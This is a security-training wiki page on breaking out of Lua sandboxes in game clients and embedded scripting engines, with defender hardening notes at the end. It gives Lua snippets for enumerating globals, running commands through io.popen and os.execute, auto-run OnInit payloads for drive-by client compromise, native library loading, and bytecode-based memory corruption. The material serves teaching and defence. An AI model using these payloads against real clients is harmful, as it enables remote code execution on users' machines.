# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

This page collects practical techniques to enumerate and break out of Lua "sandboxes" embedded in applications (notably game clients, plugins, or in-app scripting engines). Many engines expose a restricted Lua environment, but leave powerful globals reachable that enable arbitrary command execution or even native memory corruption when bytecode loaders are exposed.

Key ideas:
- Treat the VM as an unknown environment: enumerate _G and discover what dangerous primitives are reachable.
- When stdout/print is blocked, abuse any in-VM UI/IPC channel as an output sink to observe results.
- If io/os is exposed, you often have direct command execution (io.popen, os.execute).
- If load/loadstring/loadfile are exposed, executing crafted Lua bytecode can subvert memory safety in some versions (≤5.1 verifiers are bypassable; 5.2 removed verifier), enabling advanced exploitation.

## Enumerate the sandboxed environment

- Dump the global environment to inventory reachable tables/functions:

```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
  out("=== DUMPING _G ===")
  for k, v in pairs(_G) do
    out(tostring(k) .. " = " .. tostring(v))
  end
end
```

- If no print() is available, repurpose in-VM channels. Example from an MMO housing script VM where chat output only works after a sound call; the following builds a reliable output function:

```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
  -- Some engines require enabling an audio channel before speaking
  H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
  return function(msg)
    H.Say(label or 1, msg)
  end
end

function OnMenu(menuNum)
  if menuNum ~= 3 then return end
  local out = ButlerOut(1)
  dump_globals(out)
end
```

Generalize this pattern for your target: any textbox, toast, logger, or UI callback that accepts strings can act as stdout for reconnaissance.

## Direct command execution if io/os is exposed

If the sandbox still exposes the standard libraries io or os, you likely have immediate command execution:

```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```

Notes:
- Execution happens inside the client process; many anti-cheat/antidebug layers that block external debuggers won’t prevent in-VM process creation.
- Also check: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

If the host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:

```lua
function OnInit()
  io.popen("calc.exe") -- or any command
end
```

Any equivalent callback (OnLoad, OnEnter, etc.) generalizes this technique when scripts are transmitted and executed on the client automatically.

## Dangerous primitives to hunt during recon

During _G enumeration, specifically look for:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: execute source or bytecode; supports loading untrusted bytecode.
- package, package.loadlib, require: dynamic library loading and module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load to call native code directly.

Minimal usage examples (if reachable):

```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```

## Optional escalation: abusing Lua bytecode loaders

When load/loadstring/loadfile are reachable but io/os are restricted, execution of crafted Lua bytecode can lead to memory disclosure and corruption primitives. Key facts:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

This path is engine/version-specific and requires RE. See references for deep dives, exploitation primitives, and example gadgetry in games.

## Detection and hardening notes (for defenders)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua with a minimal _ENV, forbid bytecode loading, reintroduce a strict bytecode verifier or signature checks, and block process creation from the client process.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate with UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
